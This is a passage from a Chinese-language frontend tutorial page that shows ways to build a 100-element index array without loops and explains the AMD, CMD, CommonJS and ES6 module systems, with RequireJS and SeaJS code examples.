title="websocket"></a>websocket</h3><h3 id="h5-sharedWorker"><a href="#h5-sharedWorker" class="headerlink" title="h5 sharedWorker"></a>h5 sharedWorker</h3><hr><h2 id="输出长度为100的数组"><a href="#输出长度为100的数组" class="headerlink" title="输出长度为100的数组"></a>输出长度为100的数组</h2><p>不使用loop循环输入长度为100的数组，且每项的值等于它的下标，即输出：[0, 1, 2, 3, 4, 5, …];</p><p>首先假设可以使用循环，我们可以这样做：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">  arr.push(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当不可以使用循环时，我们可能会想到使用 <code>setInterval</code> 定时器来实现：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [],</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> interval = setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  i &lt; <span class="number">100</span> ? arr.push(i++) : clearInterval(interval);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>虽然这样可以实现，但是实际上使用定时器的效率并不高，而且本题考查的也不是定时器。</p><p>我们可以使用 <code>map</code> 高阶函数来实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">arr = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>但是从控制键查看发现并没有得到我们需要的结果，原来 <code>JavaScript</code> 数组是稀疏数组，通过 <code>new Array()</code> 创建的数组虽然有 <code>length</code> 属性，但实际上它是一个空数组，并不存在真实的元素，所以使用 <code>map</code> 来遍历是不可行的。我们可以通过一些手段先把它转成数组，然后使用 <code>map</code> 方法。</p><p>比如 <code>es5</code> 的 <code>new Array(100).join(&#39;,&#39;).split(&#39;,&#39;)</code><br>或 <code>es6</code> 的 <code>fill</code> 方法：<code>new Array(100).fill(&#39;&#39;)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">100</span>).join(<span class="string">','</span>).split(<span class="string">','</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr)</span><br><span class="line"></span><br><span class="line">arr = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h2 id="AMD、CMD、CommonJS、ES6模块化"><a href="#AMD、CMD、CommonJS、ES6模块化" class="headerlink" title="AMD、CMD、CommonJS、ES6模块化"></a>AMD、CMD、CommonJS、ES6模块化</h2><p><code>AMD</code>(异步模块定义)、<code>CMD</code>(通用模块定义)、<code>CommonJs</code> 是 <code>ES5</code> 中提供的模块化编程的方案<br><code>RequireJS</code> 遵循的是 <code>AMD</code><br><code>SeaJS</code> 遵循的是 CMD<br><code>CommonJS</code> 是服务器端js模块化的规范，<code>NodeJS</code> 是这种规范的实现<br><code>import/export</code> 是 <code>ES6</code> 中提出的模块化方案</p><h3 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h3><p><code>AMD</code> 是 <code>RequireJS</code> 在推广过程中对<strong>模块定义的规范化</strong>产出，它是一个概念，<code>RequireJS</code> 是对这个概念的实现。<br><code>AMD</code> 是一个组织，<code>RequireJS</code> 是在这个组织下自定义的一套脚本语言。</p><p><code>AMD</code> 规范通过 <code>define</code> 方法去定义模块，通过 <code>require</code> 方法去加载模块：</p><p><code>RequireJS</code>: 通过 <code>define()</code> 函数定义，第一个参数是一个数组，里面定义一些需要依赖的包，第二个参数是一个回调函数，通过变量来引用模块里面的方法，最后通过 <code>return</code> 来输出。</p><ul><li><p>案例1<br>define定义模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module1.js</span></span><br><span class="line"><span class="comment">// 定义独立的模块</span></span><br><span class="line">define(&#123;</span><br><span class="line">  methodA: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'我是module1的methodA'</span>);    </span><br><span class="line">  &#125;,</span><br><span class="line">  methodB: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'我是module1的methodB'</span>);    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// module2.js</span></span><br><span class="line"><span class="comment">// 另一种定义独立模块的方式</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    methodA: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodA'</span>);    </span><br><span class="line">    &#125;,</span><br><span class="line">    methodB: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodB'</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// module3.js</span></span><br><span class="line"><span class="comment">// 定义非独立的模块（这个模块依赖其他模块）,导入依赖时后缀名可省略</span></span><br><span class="line">define([<span class="string">'module1'</span>, <span class="string">'module2.js'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">m1, m2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    methodC: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      m1.methodA();</span><br><span class="line">      m2.methodB();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>再定义一个 <code>main.js</code>，去加载这些个模块，require加载：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">'module3.js'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">m3</span>)</span>&#123;</span><br><span class="line">  m3.methodC();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用方法1：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 等号右边的main指的main.js，后缀名可省略，表示入口文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">"main.js"</span> <span class="attr">src</span>=<span class="string">"require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法2：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>案例2 </p><p>设置一个全局的配置，这有利于在大型的项目中使用这种配置：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"require.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 用require引入要引入的模块，[]：里面为引入的名称，已经在main.js里面的paths设置好了</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// function()小括号里面对应[]里面值，按顺序在()给变量名</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// jquery一般用 $, bootstrap模块没有输出，函数里面可以不用变量</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 在使用的时候，只需要require我们所需的依赖即可</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">require</span>([<span class="string">'jquery'</span>,<span class="string">'bootstrap'</span>],<span class="function"><span class="keyword">function</span> (<span class="params">$</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#myModal'</span>).on(<span class="string">'shown.bs.modal'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#myInput'</span>).focus()</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局配置</span></span><br><span class="line"><span class="built_in">require</span>.config(&#123;</span><br><span class="line">    <span class="comment">// 根路径设置，paths下面全部都是根据baseUrl的路径去设置</span></span><br><span class="line">    baseUrl:<span class="string">'./js/'</span>,</span><br><span class="line">    paths:&#123;</span><br><span class="line">        <span class="comment">// 引入jQuery</span></span><br><span class="line">        jquery:<span class="string">'plugin/jquery'</span>,</span><br><span class="line">        <span class="comment">// 引入bootstrap</span></span><br><span class="line">        bootstrap:<span class="string">'plugin/bootstrap'</span>,</span><br><span class="line">        <span class="comment">// a.js</span></span><br><span class="line">        a:<span class="string">'a'</span>,</span><br><span class="line">        <span class="comment">// b.js</span></span><br><span class="line">        b:<span class="string">'b'</span>,</span><br><span class="line">        <span class="comment">// 引入c.js</span></span><br><span class="line">        c:<span class="string">'c'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 用来配置不兼容的模块，意思是：该模块没有module.exports,</span></span><br><span class="line">    <span class="comment">// jquery就有module.exports输出值</span></span><br><span class="line">    shim:&#123;</span><br><span class="line">        <span class="comment">//bootstrap没有module.exports输出值，所以得放在shim</span></span><br><span class="line">        bootstrap:&#123;</span><br><span class="line">            <span class="comment">//bootstrap需要依赖jquery，所以得加deps</span></span><br><span class="line">            deps:[<span class="string">"jquery"</span>]</span><br><span class="line">            <span class="comment">// 如果该模块加载进来，需要输出一个值，那就用exports来设置，这里不用设置</span></span><br><span class="line">            <span class="comment">// exports:''</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//map"告诉RequireJS在任何模块之前，都先载入这个模块</span></span><br><span class="line">    map: &#123;</span><br><span class="line">        <span class="comment">// 这里没有设置，举个例子</span></span><br><span class="line">        <span class="comment">// '*': &#123;</span></span><br><span class="line">            <span class="comment">// 'css': 'plugins/require-css/css'</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>output: </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我是module1的methodA</span><br><span class="line">我是module2的methodB</span><br></pre></td></tr></table></figure></li></ul><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p><code>CMD</code> 是 <code>SeaJS</code>(淘宝) 在推广过程中对<strong>模块定义的规范化</strong>产出，它是一个概念，<code>SeaJS</code> 是对这个概念的实现。<br>通过 <code>define()</code> 定义，没有依赖前置。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>); <span class="comment">// 依赖可以就近书写</span></span><br><span class="line">  a.doSomething();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> b = <span class="built_in">require</span>(<span class="string">'./b'</span>);   </span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>CMD中输入输出都是用 <code>define</code> 来定义的，只是输出的时候在 <code>define</code> 内部调用的是 <code>export.test = ***</code>，输入的时候 <code>define</code> 内部调用的是 <code>require(&#39;./module.js&#39;)</code>。</p><ul><li><p>案例1</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>seajs demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use(<span class="string">'./main.js'</span>); <span class="comment">// 通过seajs.use加载main.js文件</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> title = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>);</span><br><span class="line">  title.innerHTML = <span class="string">"yes it works in demo1"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"seajs demo" 会被替换成 "yes it works in demo1"</span><br></pre></td></tr></table></figure></li><li><p>案例2</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>seajs demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use(<span class="string">'./main.js'</span>); <span class="comment">// 通过seajs.use加载main.js文件</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>module1.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(exports); <span class="comment">// export: &#123;&#125;</span></span><br><span class="line">  <span class="keyword">var</span> textContent = <span class="string">'yes it works in demo2'</span>;</span><br><span class="line">  exports.text = textContent; <span class="comment">// 将需要输出的值存储在exports对象中，再输出</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>module2.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(exports, <span class="built_in">module</span>); </span><br><span class="line">  <span class="comment">// export: &#123;&#125;</span></span><br><span class="line">  <span class="comment">// module: &#123;dependencies: [], deps: &#123;&#125;, id: "http://127.0.0.1:8080/module2.js", uri: id: "http://127.0.0.1:8080/module2.js", status: 6&#125;</span></span><br><span class="line">  </span><br><span class="line">  exports.methodObj = &#123;</span><br><span class="line">    methodA: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodA'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    methodB: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'我是module2的methodB'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> module1 = <span class="built_in">require</span>(<span class="string">'./module1.js'</span>); <span class="comment">// 导入，注意require导入的是一个对象</span></span><br><span class="line">  <span class="keyword">var</span> title = <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>);</span><br><span class="line">  title.innerHTML = module1.text;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> module2 = <span class="built_in">require</span>(<span class="string">'./module2.js'</span>);</span><br><span class="line">  <span class="keyword">var</span> module2Method = module2.methodObj;</span><br><span class="line">  <span class="built_in">console</span>.log(module2Method.methodA());</span><br><span class="line">  <span class="built_in">console</span>.log(module2Method.methodB());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"seajs demo" 会被替换成 "yes it works in demo2"</span><br><span class="line"></span><br><span class="line">我是module2的methodA</span><br><span class="line">我是module2的methodB</span><br></pre></td></tr></table></figure></li><li><p>案例2(设置回调函数)</p><p>适用于同时引用多个模块时，通过回调参数获取到相应模块的输出</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"title"</span>&gt;</span>seajs demo<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use([<span class="string">'main'</span>, <span class="string">'jquery'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">main, $</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#title'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(main.showLog())</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> showLog = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'title clicked'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  exports.showLog = showLog; <span class="comment">// 输出showLog方法</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>案例3(设置别名等config)</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/seajs/3.0.3/sea.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  seajs.config(&#123;</span></span><br><span class="line"><span class="javascript">    alias:&#123; <span class="comment">// alias 用于设置别名</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 引入jQuery</span></span></span><br><span class="line"><span class="javascript">      jquery:<span class="string">'plugin/jquery'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 引入bootstrap</span></span></span><br><span class="line"><span class="javascript">      bootstrap:<span class="string">'plugin/bootstrap'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// a.js</span></span></span><br><span class="line"><span class="javascript">      a:<span class="string">'a'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// b.js</span></span></span><br><span class="line"><span class="javascript">      b:<span class="string">'b'</span>,</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 引入c.js</span></span></span><br><span class="line"><span class="javascript">      c:<span class="string">'c'</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  seajs.use(<span class="string">'./main.js'</span>); <span class="comment">// 通过seajs.use加载main.js文件</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>某个第三方插件，如jquery</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// jquery 源码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $ = <span class="built_in">require</span>(<span class="string">'jquery'</span>);</span><br><span class="line">  $(<span class="string">'#title'</span>).text(changeText.init());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="AMD、CMD的区别"><a href="#AMD、CMD的区别" class="headerlink" title="AMD、CMD的区别"></a>AMD、CMD的区别</h3><ul><li>对于依赖的模块，<code>AMD</code> 是提前执行，<code>CMD</code> 是延迟执行。不过 <code>RequireJS</code> 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。<code>CMD</code> 推崇 <code>as lazy as possible</code>（尽可能的懒加载，也称为延迟加载，即在需要的时候才加载）。</li><li><code>AMD</code> 推崇依赖前置，<code>CMD</code> 推崇依赖就近。</li><li><code>AMD</code> 的 <code>API</code> 默认是一个当多个用，<code>CMD</code> 的 <code>API</code> 严格区分，推崇职责单一。比如 <code>AMD</code> 里，<code>require</code> 分全局 <code>require</code> 和局部 <code>require</code>，都叫 <code>require</code>。<code>CMD</code> 里，没有全局 <code>require</code>，而是根据模块系统的完备性，提供 <code>seajs.use</code> 来实现模块系统的加载启动。<code>CMD</code> 里，每个 <code>API</code> 都简单纯粹。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AMD 默认推荐的是</span></span><br><span class="line">define([<span class="string">'./a'</span>, <span class="string">'./b'</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123; <span class="comment">// 依赖必须一开始就写好</span></span><br><span class="line">  a.doSomething();</span><br><span class="line">  b.doSomething();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CMD</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span>(<span 